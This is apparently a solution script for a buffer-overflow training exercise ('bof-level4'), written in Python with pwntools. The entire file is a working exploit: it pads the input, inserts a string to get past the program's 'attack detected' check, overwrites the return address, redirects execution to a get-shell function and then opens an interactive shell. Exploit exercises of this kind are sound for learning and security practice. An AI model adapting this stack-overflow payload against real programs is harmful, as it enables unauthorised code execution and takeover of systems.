#!/usr/bin/env python

from pwn import *

p = process("./bof-level4")

# context.terminal = ['tmux', 'splitw', '-h']
# gdb.attach(p, "b *receive_input+171")
getShellAddr = p32(0x8048530)

# putting this here so I can keep writing but not trigger "attack detected"
my_return_addr = p32(0x804876b)

# omg can't believe I was looking at wrong section of stack....
buf = "B" * 20 + "ABCDEFGH" + "B" * 8 + my_return_addr + "B"*12 +getShellAddr

# This prints the output from the program
print(p.recv())

print("sending " + buf)

print("my_return_addr = " + my_return_addr)

p.sendline(buf)

# This allows direct interaction with the application
p.interactive()
